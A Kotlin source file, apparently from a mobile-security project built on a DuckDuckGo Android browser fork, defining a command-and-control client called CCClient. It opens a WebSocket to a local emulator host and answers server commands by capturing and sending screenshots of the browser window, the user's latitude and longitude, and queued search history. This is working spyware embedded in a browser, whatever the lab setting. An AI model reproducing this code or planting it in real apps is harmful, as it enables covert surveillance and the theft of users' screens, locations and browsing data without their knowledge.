/*
 * Copyright (c) 2024 DuckDuckGo
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.duckduckgo.app.mobilesecproject

import android.graphics.Bitmap
import android.view.View
import com.duckduckgo.app.browser.BrowserActivity
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import org.json.JSONObject
import timber.log.Timber
import java.io.ByteArrayOutputStream
import java.util.LinkedList
import android.location.Location
import java.util.Queue

class CCClient private constructor() {

    private var websocketUri: String = "ws://10.0.2.2:8765";
    private var tag: String = "CCClient.MobSec";
    private var webSocket: WebSocket;
    private var client = OkHttpClient();
    private val queue: Queue<String> = LinkedList()
    private val locationQueue: Queue<String> = LinkedList()

    lateinit var controllingActivity : BrowserActivity

    init {
        Timber.tag(tag).i("CCClient Created.");
        val request = Request.Builder()
            .url(websocketUri)
            .build()

        webSocket = client.newWebSocket(request, SerializedWebSocketListener())
        Timber.tag(tag).i("WebSocket Client Created.");
    }

    fun addToLocationQueue(data: Location) {
        Timber.tag(tag).i("Added to location queue.");
        val toSend = "Location: " + data.latitude.toString() + data.longitude.toString()
        locationQueue.add(toSend)
    }

    fun addToQueue(data : String) {
        queue.add(data)
    }

    fun setActivity(activity: BrowserActivity) {
        controllingActivity = activity
    }

    companion object {
        @Volatile
        private var instance: CCClient? = null

        fun getInstance(): CCClient {
            if (instance == null) {
                synchronized(this) {
                    if (instance == null) {
                        instance = CCClient()
                    }
                }
            }
            return instance!!
        }
    }

    private fun sendToServer(
        data: String,
        command: String
    ) {
        val rootObject = JSONObject()
        rootObject.put("command",command)
        rootObject.put("payload", data)
        webSocket.send(rootObject.toString())
    }

    fun sendScreenshot(view: View) {
       Timber.tag(tag).i("sending sendScreenshot");
        view.isDrawingCacheEnabled = true
       val bitmap = Bitmap.createBitmap(view.drawingCache)
       val outputStream = ByteArrayOutputStream()
       bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream)
        view.isDrawingCacheEnabled = false
       val bytes = ByteString.of(*outputStream.toByteArray())
        val rootObject = JSONObject()
        rootObject.put("command","update_screenshots")
        rootObject.put("payload", bytes.base64())
       webSocket.send(rootObject.toString());
    }

    inner class SerializedWebSocketListener() : WebSocketListener() {
        private var tag: String = "CCClient.MobSec";

        override fun onOpen(
            webSocket: WebSocket,
            response: okhttp3.Response
        ) {
            Timber.tag(tag).i("WebSocket opened.");
        }

        override fun onMessage(
            webSocket: WebSocket,
            text: String
        ) {
            try {
                val json = JSONObject(text)
                val comm = json.get("command").toString()
                Timber.tag(tag).i("Received command from server: $comm");
                when (comm) {
                    "pull_screenshots" -> {
                        sendScreenshot(controllingActivity.window.decorView.rootView)
                    }
                    "pull_location" -> {
                        sendToServer(locationQueue.remove(), "update_location")
                    }
                    "pull_search_history" -> {
                        sendToServer(queue.remove(), "update_search_history")
                    }
                }

                Timber.tag(tag).i("Replied to server command: $comm");

            } catch (e : Exception) {
                Timber.tag(tag).i("Server sent invalid command. Ignoring. ${e.message}")
            }
        }

        override fun onMessage(
            webSocket: WebSocket,
            bytes: ByteString
        ) {
            try {
                val command = bytes.string(Charsets.UTF_8)
                val json = JSONObject(command)
                val comm = json.get("command").toString()
                Timber.tag(tag).i("Received bytestring command from server: $comm")

                when (comm) {
                    "pull_screenshots" -> {
                        sendScreenshot(controllingActivity.window.decorView.rootView)
                    }
                    "pull_location" -> {
                        sendToServer(locationQueue.remove(), "update_location")
                    }
                    "pull_search_history" -> {
                        sendToServer(queue.remove(), "update_search_history")
                    }
                }

                Timber.tag(tag).i("Replied to server command: $comm");

            } catch (e: Exception) {
                Timber.tag(tag).i("Server sent invalid command. Ignoring. ${e.message}")
            }
        }

        override fun onClosed(
            webSocket: WebSocket,
            code: Int,
            reason: String
        ) {
            Timber.tag(tag).i("WebSocket closed: ${reason}")
            super.onClosed(webSocket, code, reason)
        }

        override fun onFailure(
            webSocket: WebSocket,
            t: Throwable,
            response: okhttp3.Response?
        ) {
            Timber.tag(tag).i("WebSocket error: ${t.message}")
        }
    }
}
